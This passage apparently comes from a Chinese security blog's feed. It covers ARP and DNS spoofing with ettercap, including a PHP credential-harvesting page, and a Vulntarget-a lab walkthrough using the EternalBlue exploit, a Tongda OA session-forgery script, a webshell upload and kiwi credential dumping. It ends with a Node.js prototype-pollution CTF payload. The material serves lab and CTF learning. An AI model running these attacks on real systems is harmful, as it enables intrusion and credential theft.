#开启端口转发<br></code></pre></td></tr></table></figure><p>之后关闭 arp攻击选项 执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">driftnet</span> -i eth<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>为了保证试验成功 进来选取http站点 比如 <a href="http://www.hnyzzy.com/">http://www.hnyzzy.com/</a></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252010192.png" alt="image-20220325201006918"></p><center>抓取到的图片</center><p>使用tcpdump检验是否代理</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> -i eth<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252010072.png" alt="image-20220325201040013"></p><p>一点解决方案：</p><ul><li>arp -s 192.168.1.1  00-19-e0-aa-9b-e4  绑定ip和对应mac地址</li></ul><h2 id="dns欺骗"><a href="#dns欺骗" class="headerlink" title="dns欺骗"></a>dns欺骗</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>​    访问 <code>www.baidu.com</code> ，首先要向本地DNS服务器发出DNS请求，查询 <code>www.baidu.com</code> 的IP地址，如果本地DNS服务器没有在自己的DNS缓存表中发现该网址的记录，就会向根服务器发起查询，根服务器收到请求后，将com域服务器的地址返回给本地DNS服务器，本地DNS服务器则继续向com域发出查询请求，域服务器将 baidu.com 授权域名服务器的地址返回给本地DNS服务器，本地DNS服务器继续向 baidu.com 发起查询，得到 <code>www.baidu.com</code> 的IP本地DNS服务器得到 <code>www.baidu.com</code> 对应的IP地址后以dns应答包的方式传递给用户，并且在本地建立DNS缓存表。<br>Windows下查看和刷清空DNS缓存表的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ipconfig /displaydns<br>ipconfig /flushdns<br></code></pre></td></tr></table></figure><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>编辑  ettercap 的dns文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>ettercap/etter.dns<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252341414.png" alt="image-20220325234118261"></p><p>接着上面的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ettercap -G     #唤醒ettercap<br></code></pre></td></tr></table></figure><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252251912.png" alt="image-20220325225119837" style="zoom:88%;" /><center>开始程序</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252253913.png" alt="image-20220325225311836"></p><center>设置选项</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252253600.png" alt="image-20220325225353528"></p><center>使用 arppoisoning攻击模块</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252254426.png" alt="image-20220325225428367"></p><center>使用远程连接模式</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252256674.png" alt="image-20220325225631609"></p><center>加载dns_spoof插件</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203252342383.png" alt="image-20220325234259301"></p><center>攻击效果展示</center><p>简化版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ettercap -TqM ARP:remote -P dns_spoof /192.168.145.2// /192.168.145.132//<br></code></pre></td></tr></table></figure><p>后续利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$name</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$passwd</span>)&#123;<br>        header(<span class="hljs-string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script language=\&quot;JavaScript\&quot;&gt;alert(\&quot;密码错误\&quot;);&lt;/script&gt;&quot;</span>;<br>        <span class="hljs-variable">$data</span>=<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;|&#x27;</span>.<span class="hljs-variable">$passwd</span>;<br>        <span class="hljs-variable">$myfile</span> = fopen(<span class="hljs-string">&quot;testfile.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><br>        fwrite(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$data</span>);<br>        fclose(<span class="hljs-variable">$myfile</span>);<br>        <br>        <br>        Header(<span class="hljs-string">&quot;Location:http://192.168.145.128/1ndex.html&quot;</span>); <br>    &#125;<br></code></pre></td></tr></table></figure><p>这样可以将截取到的 用户名密码写入 文件然后跳转到正确的页面。然而我这里不知道为什么不能弹窗了…求解 如果你知道答案请留言给我。</p>]]></content>
    
    
    <categories>
      
      <category>kali</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vulntarget-a靶场记录</title>
    <link href="/2022/03/21/Vulntarget-a%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/03/21/Vulntarget-a%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Vulntarget-a靶场记录"><a href="#Vulntarget-a靶场记录" class="headerlink" title="Vulntarget-a靶场记录"></a>Vulntarget-a靶场记录</h1><h2 id="外围打点"><a href="#外围打点" class="headerlink" title="外围打点"></a>外围打点</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211030714.png" alt="image-20220321103008393"></p><center>首页</center><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">nmap -A -v -sS -T4 192.168.110.129<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202031963.png" alt="image-20220320203138844"></p><p>开启 端口 80 125 135 139 445 </p><p>由于目标主机是 windows系统且开放445端口，尝试用 ms17010</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap --script=vuln 192.168.110.129<br></code></pre></td></tr></table></figure><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202034862.png" alt="image-20220320203411718" style="zoom: 80%;" /><p><strong>确认OA系统版本</strong></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202036908.png" alt="image-20220320203639821"></p><h3 id="getshell支线一"><a href="#getshell支线一" class="headerlink" title="getshell支线一"></a>getshell支线一</h3><blockquote><p>msfgetshell</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br>search ms17<br>set payload exploit/windows/smb/ms17_010_eternalblue<br>show options<br>set rhost 192.168.110.129<br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202058983.png" alt="image-20220320205818816"></p><p>ok，拿到meterpreter</p><h3 id="getshell支线二"><a href="#getshell支线二" class="headerlink" title="getshell支线二"></a>getshell支线二</h3><blockquote><p>文件上传getshell</p></blockquote><h4 id="通达OA-前台任意用户伪造登录"><a href="#通达OA-前台任意用户伪造登录" class="headerlink" title="通达OA 前台任意用户伪造登录"></a>通达OA <strong>前台任意用户伪造登录</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br> <br>headers=&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getV11Session</span>(<span class="hljs-params">url</span>):</span><br>    checkUrl = url+<span class="hljs-string">&#x27;/general/login_code.php&#x27;</span><br>    <span class="hljs-built_in">print</span>(checkUrl)<br>    <span class="hljs-keyword">try</span>:<br>        headers[<span class="hljs-string">&quot;User-Agent&quot;</span>] = <span class="hljs-string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;</span><br>        getSessUrl = url+<span class="hljs-string">&#x27;/logincheck_code.php&#x27;</span><br>        res = requests.post(<br>            getSessUrl, data=&#123; <span class="hljs-string">&#x27;UID&#x27;</span>: <span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)&#125;,headers=headers)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]Get Available COOKIE:&#x27;</span>+res.headers[<span class="hljs-string">&#x27;Set-Cookie&#x27;</span>])<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-]Something Wrong With &#x27;</span>+url)<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    getV11Session(<span class="hljs-string">&quot;http://192.168.110.129/&quot;</span>)<br>    <br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211029414.png" alt="image-20220321102901251"></p><center>如图将脚本的结果对原登录页面的session进行替换</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211032043.png" alt="image-20220321103235853"></p><center>访问/general/index.php进入后台</center><h4 id="后台文件上传getshell"><a href="#后台文件上传getshell" class="headerlink" title="后台文件上传getshell"></a>后台文件上传getshell</h4><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211040131.png" alt="image-20220321104052033"></p><center>找到附件管理组件</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211043015.png" alt="image-20220321104346921"></p><center>添加存储目录</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211108603.png" alt="image-20220321110803551"></p><center>找到文件上传入口</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211107378.png" alt="image-20220321110744263"></p><center>php加.上传文件右侧返回文件名</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211113937.png" alt="image-20220321111301874"></p><p>成功getshell</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203211122097.png" alt="image-20220321112227992"></p><center>上传我们的木马</center><h2 id="第二台机器"><a href="#第二台机器" class="headerlink" title="第二台机器"></a>第二台机器</h2><h3 id="抓取用户密码"><a href="#抓取用户密码" class="headerlink" title="抓取用户密码"></a>抓取用户密码</h3><p>接着msf1710得到的shell来看</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203202216507.png" alt="image-20220320221653406"></p><p>可以看到已经是 SYSTEM 权限了，尝试去抓一下哈希</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">meterpreter &gt; load kiwi<br>meterpreter &gt; creds_all<br>[+] Running as SYSTEM<br>[*] Retrieving all credentials<br><span class="hljs-section">msv credentials</span><br><span class="hljs-section">===============</span><br><br>Username  Domain   LM                                NTLM                              SHA1<br><span class="hljs-bullet">--------  </span>------   --                                ----                              ----<br>win7      win7-PC  f0d412bd764ffe81aad3b435b51404ee  209c6174da490caeb422f3fa5a7ae634  7c87541fd3f3ef5016e12d411900c87a6046a8e8<br><br><span class="hljs-section">wdigest credentials</span><br><span class="hljs-section">===================</span><br><br>Username  Domain     Password<br><span class="hljs-bullet">--------  </span>------     --------<br>(null)    (null)     (null)<br>WIN7-PC$  WORKGROUP  (null)<br>win7      win7-PC    admin<br><br><span class="hljs-section">tspkg credentials</span><br><span class="hljs-section">=================</span><br><br>Username  Domain   Password<br><span class="hljs-bullet">--------  </span>------   --------<br>win7      win7-PC  admin<br><br><span class="hljs-section">kerberos credentials</span><br><span class="hljs-section">====================</span><br><br>Username  Domain     Password<br><span class="hljs-bullet">--------  </span>------     --------<br>(null)    (null)     (null)<br>win7      win7-PC    admin<br>win7-pc$  WORKGROUP  (null)<br></code></pre></td></tr></table></figure><h3 id="跨网段扫描"><a href="#跨网段扫描" class="headerlink" title="跨网段扫描"></a>跨网段扫描</h3>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nodejs原型链污染浅析</title>
    <link href="/2022/03/17/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%B5%85%E6%9E%90/"/>
    <url>/2022/03/17/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="note note-success">            <p>水了…水了</p>          </div><h2 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h2><figure class="highlight js"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> object1=&#123;<br>    <span class="hljs-string">&quot;firstname&quot;</span>:<span class="hljs-string">&quot;yu&quot;</span><br>    <br>&#125;<br>object1.__proto__.secondname=<span class="hljs-string">&quot;ma&quot;</span>;<br><span class="hljs-built_in">console</span>.log(object1.firstname+object1.secondname);<br><span class="hljs-keyword">var</span> object2=&#123;<br>    <span class="hljs-string">&quot;firstname&quot;</span>:<span class="hljs-string">&quot;zhi&quot;</span><br>&#125;<br><span class="hljs-built_in">console</span>.log(object2.firstname+object2.secondname);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">output:</span><br><span class="hljs-comment">yuma</span><br><span class="hljs-comment">zhima</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>​    可以看到 object2 拥有了 <code>secondname</code> 这个属性，这是由于当我们访问不存在的属性时，就会从该对象的构造函数 <code>prototype</code> 查找属性，一直查找到null为止</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203172146230.png" alt="image-20220317214655142"></p><h2 id="CTF相关题目"><a href="#CTF相关题目" class="headerlink" title="CTF相关题目"></a>CTF相关题目</h2><h3 id="ctfshow-web-338"><a href="#ctfshow-web-338" class="headerlink" title="ctfshow web 338"></a>ctfshow web 338</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.session;<br>  <span class="hljs-keyword">let</span> user = &#123;&#125;;<br>  utils.copy(user,req.body);<br>  <span class="hljs-keyword">if</span>(secert.ctfshow===<span class="hljs-string">&#x27;36dboy&#x27;</span>)&#123;<br>    res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span>+<span class="hljs-built_in">JSON</span>.stringify(user)&#125;);  <br>  &#125;<br></code></pre></td></tr></table></figure><p>​    可以发现 line 11 对 secret 进行比较 而 ctfshow 是一个不存在的属性 这个时候 就可以 控制 <code>__proto__</code> 为  <code>36dboy</code> 这样 向上找值 就会找到 恶意的内容</p><p>payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;ctfshow&quot;</span>:<span class="hljs-string">&quot;36dboy&quot;</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>注意 这里的数据格式要求 是 json</p><h3 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h3><p>我擦…居然是 nodejs原型链污染 我没看出来 我有罪</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; exec &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>); <span class="hljs-comment">//rce</span><br><br><br><span class="hljs-keyword">var</span> app = express();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Notes</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-title">constructor</span>(<span class="hljs-params"></span>)</span> &#123;<br>        <span class="hljs-built_in">this</span>.owner = <span class="hljs-string">&quot;whoknows&quot;</span>;<br>        <span class="hljs-built_in">this</span>.num = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">this</span>.note_list = &#123;&#125;;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-title">write_note</span>(<span class="hljs-params">author, raw_note</span>)</span> &#123;<br>        <span class="hljs-built_in">this</span>.note_list[(<span class="hljs-built_in">this</span>.num++).toString()] = &#123;<span class="hljs-string">&quot;author&quot;</span>: author,<span class="hljs-string">&quot;raw_note&quot;</span>:raw_note&#125;;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-title">get_note</span>(<span class="hljs-params">id</span>)</span> &#123;<br>        <span class="hljs-keyword">var</span> r = &#123;&#125;<br>        undefsafe(r, id, undefsafe(<span class="hljs-built_in">this</span>.note_list, id));<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-title">edit_note</span>(<span class="hljs-params">id, author, raw</span>)</span> &#123;<br>        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-title">get_all_notes</span>(<span class="hljs-params"></span>)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.note_list;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-title">remove_note</span>(<span class="hljs-params">id</span>)</span> &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-built_in">this</span>.note_list[id];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> notes = <span class="hljs-keyword">new</span> Notes();<br>notes.write_note(<span class="hljs-string">&quot;nobody&quot;</span>, <span class="hljs-string">&quot;this is nobody&#x27;s first note&quot;</span>);<br><br><br>app.set(<span class="hljs-string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);<br><br>app.use(express.json());<br>app.use(express.urlencoded(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.use(express.static(path.join(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><br>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Notebook&#x27;</span> &#125;);<br>&#125;);<br><br>app.route(<span class="hljs-string">&#x27;/add_note&#x27;</span>)<br>    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;please use POST to add a note&#x27;</span>&#125;);<br>    &#125;)<br>    .post(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        <span class="hljs-keyword">let</span> author = req.body.author;<br>        <span class="hljs-keyword">let</span> raw = req.body.raw;<br>        <span class="hljs-keyword">if</span> (author &amp;&amp; raw) &#123;<br>            notes.write_note(author, raw);<br>            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;add note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;did not add note&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.route(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .post(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        <span class="hljs-keyword">let</span> id = req.body.id;<br>        <span class="hljs-keyword">let</span> author = req.body.author;<br>        <span class="hljs-keyword">let</span> enote = req.body.raw;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.edit_note(id, author, enote);<br>            res.render(<span 